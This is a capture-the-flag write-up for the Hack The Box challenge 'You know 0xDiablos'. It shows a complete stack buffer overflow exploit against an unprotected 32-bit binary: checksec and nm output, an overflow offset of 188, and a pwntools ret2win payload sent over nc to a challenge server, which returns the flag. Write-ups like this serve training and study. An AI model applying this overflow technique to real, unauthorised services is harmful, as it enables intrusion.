# You know 0xDiablos


We have a 32 bit ELF
```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ file vuln 
vuln: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ab7f19bb67c16ae453d4959fba4e6841d930a6dd, for GNU/Linux 3.2.0, not stripped
```
We have a buffer overflow with no protections enabled.
```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ ./vuln 
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ checksec --file ./vuln 
[*] '/home/ubuntu/Desktop/You_know_0xDiablos/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ nm ./vuln 
0804bf10 d _DYNAMIC
0804c000 d _GLOBAL_OFFSET_TABLE_
0804a004 R _IO_stdin_used
0804a218 r __FRAME_END__
0804a058 r __GNU_EH_FRAME_HDR
0804c03c D __TMC_END__
0804c03c B __bss_start
0804c034 D __data_start
080491b0 t __do_global_dtors_aux
0804bf0c d __do_global_dtors_aux_fini_array_entry
0804c038 D __dso_handle
0804bf08 d __frame_dummy_init_array_entry
         w __gmon_start__
0804bf0c d __init_array_end
0804bf08 d __init_array_start
08049390 T __libc_csu_fini
08049330 T __libc_csu_init
         U __libc_start_main@@GLIBC_2.0
08049391 T __x86.get_pc_thunk.bp
08049120 T __x86.get_pc_thunk.bx
08049110 T _dl_relocate_static_pie
0804c03c D _edata
0804c040 B _end
08049398 T _fini
0804a000 R _fp_hw
08049000 T _init
080490d0 T _start
0804c03c b completed.6887
0804c034 W data_start
08049130 t deregister_tm_clones
         U exit@@GLIBC_2.0
         U fgets@@GLIBC_2.0
080491e2 T flag
         U fopen@@GLIBC_2.1
080491e0 t frame_dummy
         U getegid@@GLIBC_2.0
         U gets@@GLIBC_2.0
080492b1 T main
         U printf@@GLIBC_2.0
         U puts@@GLIBC_2.0
08049170 t register_tm_clones
         U setresgid@@GLIBC_2.0
         U setvbuf@@GLIBC_2.0
         U stdout@@GLIBC_2.0
08049272 T vuln
```
There is a function called flag at `080491e2`, let's see what happens if we overwrite the return pointer with that address.
The offset is 188.
```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xe2\x91\x04\x08\xe2\x91\x04\x08' | ./vuln 
You know who are 0xDiablos: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Hurry up and try in on server side.
```

I thought it was only that, but nah, the function has to be called with 2 params for it to work.

param1 -> -0x2152411
param2 -> -0x3f212ff3

Compute the numbers using 2's complement.

```python
>>> hex(0xffffffff-0x21524111+1)
'0xdeadbeef'
>>> hex(0xffffffff-0x3f212ff3+1)
'0xc0ded00d'
```
```python
#!/usr/bin/python3

from pwn import *

flag = p32(0x080491e2)
param1 = p32(0xdeadbeef)
param2 = p32(0xc0ded00d)
return_add = p32(0xdeadbabe) # no reason
payload = [b'A'*188, flag, p32(0xdeadbabe), param1, param2]
payload = b''.join(payload)
sys.stdout.buffer.write(payload)
```

```bash
ubuntu@ubuntu:~/Desktop/You_know_0xDiablos$ (cat payload; cat) | nc 138.68.148.149 30636
You know who are 0xDiablos: 

���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA����ﾭ�
HTB{0ur_Buff3r_1s_not_healthy}
```